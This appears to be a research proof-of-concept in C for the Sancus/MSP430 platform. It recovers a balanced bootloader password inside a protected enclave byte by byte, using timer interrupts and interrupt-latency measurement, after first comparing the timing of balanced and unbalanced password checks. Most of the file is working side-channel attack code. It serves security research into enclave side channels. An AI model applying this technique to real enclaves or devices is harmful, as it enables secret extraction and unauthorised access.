#include <sancus/sm_support.h>
#include <sancus_support/uart.h>
#include <msp430.h>
#include "sm_io_wrap.h"
#include "sm-bsl.h"

#define ENABLE_SANCUS_PROTECTION        1
#define DEBUG                           0

/*
 * Number of cycles up to first conditional jump in balanced BSL password
 * comparison routine. (Experimental value obtained via the LEAK_BSL_TSC
 * precompiler definition in sm-bsl.h).
 */
#define BSL_FIRST_JZ_TSC                254
#define BSL_INTERVAL_TSC                16

/* ============================== MAIN ================================== */

#if DEBUG
    #define DEBUG_PRINT(fmt, args...)   printf(fmt, args)
#else
    #define DEBUG_PRINT(fmt, args...)
#endif

#define EXIT()                              \
    /* set CPUOFF bit in status register */ \
    asm("bis #0x210, r2");

#define TACTL_DISABLE       (TACLR)
#define TACTL_ENABLE        (TASSEL_2 + MC_1 + TAIE)
#define TACTL_CONTINUOUS    ((TASSEL_2 + MC_2) & ~TAIE)

/* Operate Timer_A in continuous mode to act like a Time Stamp Counter. */
#define TSC_TIMER_A_START                   \
    TACTL = TACTL_DISABLE;                  \
    TACCR0 = 0x1;                           \
    TACTL = TACTL_CONTINUOUS;

/* Fire an IRQ after the specified number of cycles have elapsed. Timer_A TAR
   register will continue counting from zero after IRQ generation. */
#define IRQ_TIMER_A( interval )             \
    TACTL = TACTL_DISABLE;                  \
    /* 1 cycle overhead TACTL write */      \
    TACCR0 = interval - 1;                  \
    /* source mclk, up mode */              \
    TACTL = TACTL_ENABLE;

int __global_thrid = 1;
int pwd_idx, pwd_byte = 0;
int isr_found_pwd_byte = 0;

int main(void)
{
    WDTCTL = WDTPW | WDTHOLD;

    sm_io_init();
    puts("\n\n------------------------");
    puts("[main] Hi from main...");

    #if ENABLE_SANCUS_PROTECTION    
        sancus_enable(&sm_bsl);
        dump_sm_layout(&sm_bsl);
    #endif

    /** Enable Timer_A IRQ and init SMs **/
    asm("eint\n\t");
    BSL430_unlock_BSL_unbalanced("deadbeef");
    BSL430_unlock_BSL_balanced("deadbeef");
    
    /** Reference measurements to ensure balancing masks timing differences **/
    puts("[main] testing balanced BSL for end-to-end execution timing attack..");
    
    char ivt_wrong1[BSL_PASSWORD_LENGTH],ivt_wrong2[BSL_PASSWORD_LENGTH];
    char *ivt = (char*) INTERRUPT_VECTOR_START;
    for (int i = 0; i < BSL_PASSWORD_LENGTH; i++, ivt++)
    {
        DEBUG_PRINT("ivt[%d] is 0x%x\n", i, *ivt & 0xff);
        ivt_wrong1[i] = *ivt;
        ivt_wrong2[i] = *ivt;
    }
    ivt_wrong1[0] = 0xaa;
    ivt_wrong2[0] = 0xaa;
    ivt_wrong2[1] = 0xaa;
    
    int rv, tsc1, tsc2, tsc3, tsc4;    
    TSC_TIMER_A_START
    rv = BSL430_unlock_BSL_unbalanced(ivt_wrong1);
    tsc1 = TAR;

    TSC_TIMER_A_START
    rv = BSL430_unlock_BSL_unbalanced(ivt_wrong2);
    tsc2 = TAR;

    TSC_TIMER_A_START
    rv = BSL430_unlock_BSL_balanced(ivt_wrong1);
    tsc3 = TAR;

    TSC_TIMER_A_START
    rv = BSL430_unlock_BSL_balanced(ivt_wrong2);
    tsc4 = TAR;
    
    DEBUG_PRINT("Unbalanced: wrong pwd[0] byte with TSC %d\n", tsc1);
    DEBUG_PRINT("Unbalanced: wrong pwd[0]+[1] bytes with TSC %d\n", tsc2);
    DEBUG_PRINT("Balanced: wrong pwd[0] byte with TSC %d\n", tsc3);
    DEBUG_PRINT("Unbalanced: wrong pwd[0]+[1] bytes with TSC %d\n", tsc4);

    if (tsc1+2 != tsc2)
        puts("--> WARNING: unbalanced BSL is not retarded by two cycles..\n");
    else if (tsc3 != tsc4)
        puts("--> WARNING: hardened BSL pwd comparison is unbalanced..\n");
    else
        puts("--> OK");
    
#ifdef LEAK_BSL_TSC
    TSC_TIMER_A_START
    rv = BSL430_unlock_BSL_balanced(ivt_wrong1);
    printf("Balanced: wrong pwd[0] with spy TSC %d and rv %d\n", spy_tsc, rv);

    ivt_wrong2[0] = *((char*) INTERRUPT_VECTOR_START);
    TSC_TIMER_A_START
    rv = BSL430_unlock_BSL_balanced(ivt_wrong2);
    printf("Balanced: wrong pwd[1] with spy TSC %d and rv %d\n", spy_tsc, rv);

    EXIT()
#endif

    /** Attack balanced BSL byte per byte through IRQ latency **/
    
    char guess[BSL_PASSWORD_LENGTH];
    for (int i = 0; i < BSL_PASSWORD_LENGTH; i++)
        guess[i] = 0xaa;
    
    for (pwd_idx = 0; pwd_idx < BSL_PASSWORD_LENGTH; pwd_idx++)
    {
        DEBUG_PRINT("Attacking %dth password byte\n", pwd_idx);
        int interval = BSL_FIRST_JZ_TSC + pwd_idx * BSL_INTERVAL_TSC;
        isr_found_pwd_byte = 0;
        
        for (pwd_byte=0; pwd_byte < 256 && !isr_found_pwd_byte; pwd_byte++)    
        {
            guess[pwd_idx] = (char) pwd_byte;
            IRQ_TIMER_A( interval )
            BSL430_unlock_BSL_balanced(guess);
        }
    }
    
    puts("\n[main] exiting...");
    EXIT()
}


/* =========================== TIMER A ISR =============================== */

#if ENABLE_SANCUS_PROTECTION
    #define HW_IRQ_LATENCY      34
#else
    #define HW_IRQ_LATENCY      32
#endif
#define ISR_STACK_SIZE          512

#define BIS_LATENCY             2
#define NOP_LATENCY             1

uint16_t __isr_stack[ISR_STACK_SIZE];
void*    __isr_sp = &__isr_stack[ISR_STACK_SIZE-1];
void*    __isr_reti_addr;
int      __isr_tar_entry;

#define WRAP_ISR(fct)                                           \
    asm(    "mov &%0, &__isr_tar_entry                  \n\t"   \
            "mov &__isr_sp, r1                          \n\t"   \
            /* unprotected domain is not interrupted in test */ \
            "mov r15, &__isr_reti_addr                  \n\t"   \
            "mov r15, r14                               \n\t"   \
            /* sancus_get_caller_id */                          \
            ".word 0x1387                               \n\t"   \
            "call #" #fct "                             \n\t"   \
            /* simulate reti with gie enabled in status */      \
            /* word to terminate ISR atomic section     */      \
            "mov #0xfffe, r4                            \n\t"   \
            "push &__isr_reti_addr                      \n\t"   \
            "push #0x0008                               \n\t"   \
            /* enable TimerA and enter SM */                    \
            "mov r15, &%1                               \n\t"   \
            "reti                                       \n\t"   \
            ::"m"(TAR),"m"(TACTL):);

uint16_t do_timerA_isr(sm_id callerID, void* retiAddr)
{
    TACTL = TACTL_DISABLE;
    int latency = __isr_tar_entry - HW_IRQ_LATENCY - 1;
    //DEBUG_PRINT("[isr] timer A IRQ with callerID %x; retiAddr %p; " \
                  "latency %d\n", callerID, retiAddr, latency);

    if (latency == NOP_LATENCY)
    {
        printf("[isr] %dth pasword byte is 0x%x\n",
            pwd_idx, pwd_byte);
        isr_found_pwd_byte = 1;
    }

    return TACTL_DISABLE;
}

__attribute__ ((naked)) __attribute__((interrupt(16))) void timerA_isr(void)
{
    WRAP_ISR(do_timerA_isr)
}


/* =========================== VIOLATION ISR =============================== */

void stop_violation(sm_id callerID, void* retiAddr )
{
    printf("--> VIOLATION from reti address %p; exiting...\n", retiAddr);
    EXIT()
}

__attribute__ ((naked)) __attribute__((interrupt(SM_VECTOR))) void the_isr(void)
{
    WRAP_ISR(stop_violation)
}
